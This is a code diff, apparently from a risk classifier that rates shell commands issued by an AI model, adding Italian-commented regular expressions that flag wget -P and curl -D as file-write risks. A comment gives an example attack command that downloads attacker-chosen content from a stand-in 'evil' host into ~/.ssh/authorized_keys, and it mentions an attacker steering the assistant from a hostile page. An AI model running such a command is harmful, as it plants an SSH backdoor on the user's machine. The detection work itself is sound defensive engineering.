@@ -160,6 +160,30 @@
   // curl -j = --junk-session-cookies, innocuo).
   const CURL_WGET_OUTPUT_RE = /(^|\s)(--output|--remote-name|--remote-header-name|-[a-z]*o)/i;
 
+  // wget con `-P`/`--directory-prefix` sceglie la CARTELLA di destinazione e il
+  // nome del file arriva dall'URL (quindi dal server): `wget -P ~/.ssh http://
+  // evil/authorized_keys` scarica contenuto interamente scelto dall'attaccante
+  // dritto in ~/.ssh/authorized_keys. È la stessa backdoor di `-O`, solo scritta
+  // scegliendo la dir invece del file → deve salire a 3. Check wget-specifico:
+  // `-P` (uppercase) è, in wget, SOLO `--directory-prefix` (nessun altro
+  // short-flag wget usa la P maiuscola), quindi anche dentro un bundle
+  // (`-rP /dir`, `-P/dir` attaccato) l'unica lettura possibile è quella. La `P`
+  // è case-SENSITIVE apposta: `-p` = `--page-requisites` (scrive nella cwd, non
+  // arbitrario) e `-np` = `--no-parent` NON devono salire. `--directory-prefix`
+  // (doppio trattino) è gestito a parte: il ramo short a trattino singolo non lo
+  // intercetta.
+  const WGET_PREFIX_RE = /(^|\s)(--directory-prefix(=|\s|$)|-[a-zA-Z]*P)/;
+
+  // curl con `-D`/`--dump-header <file>` scrive gli header della risposta in un
+  // percorso arbitrario: il contenuto lo decide il server (quindi l'attaccante
+  // che pilota l'assistente da una pagina ostile), rendendolo un altro primitivo
+  // di scrittura-su-file arbitraria → 3. Meno potente di `-o`/`-O` (byte header,
+  // non corpo scelto liberamente) ma stessa classe: over-cautela = solo attrito.
+  // Check curl-specifico e case-SENSITIVE sulla `D`: `-d`/`--data` (corpo POST)
+  // è innocuo e NON deve salire; solo la `D` maiuscola (in curl = solo
+  // `--dump-header`) alza, anche in bundle (`-sD file`).
+  const CURL_DUMP_RE = /(^|\s)(--dump-header|-[a-zA-Z]*D)/;
+
   // git: il livello dipende dal sotto-comando. I sotto-comandi "duali"
   // (tag, branch, config, remote) NON stanno qui: leggono da soli ma scrivono
   // con un operando, quindi li classifica GIT_DUAL guardando gli argomenti.
